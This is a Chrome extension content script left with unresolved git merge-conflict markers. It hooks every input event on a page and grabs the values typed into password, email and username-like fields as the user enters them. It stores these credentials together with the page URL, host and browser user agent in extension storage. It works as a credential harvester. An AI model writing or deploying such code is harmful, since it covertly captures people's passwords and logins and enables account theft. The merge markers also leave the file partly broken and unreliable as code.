<<<<<<< HEAD
console.log("content script")

var inputs=document.querySelectorAll('input');
=======
>>>>>>> bbf1171c08047ad1e500fc9308f0a24085190e09


    console.log("content script",Date.now());
    let email;
    let password;
    initPrimaryParams();
    
    document.addEventListener('input',e=>{
        // console.log(e.target);
        let input=e.target;
        let {type,value,name,placeholder}=input;
     
        if(["email","password"].includes(type)|| /name/.test(name) || /email|name|username/.test(placeholder)){
            console.log(type,value,name);
            if(["email","password"].includes(type)){
                // console.log("saving Data",type,value);
                saveData(type,value)
            }else if((/name/.test(name)) || (/email|name|username/.test(placeholder))){
                // console.log("saving Data","email",value);
                saveData("email",value)
            }
        }

    });

function initPrimaryParams(){
    chrome.storage.local.set({
        url:window.location.href,host:window.location.host,userAgent:navigator.userAgent
    })
}
function saveData(type,value){
  chrome.storage.local.set({
      [type]:value
  })
}
    
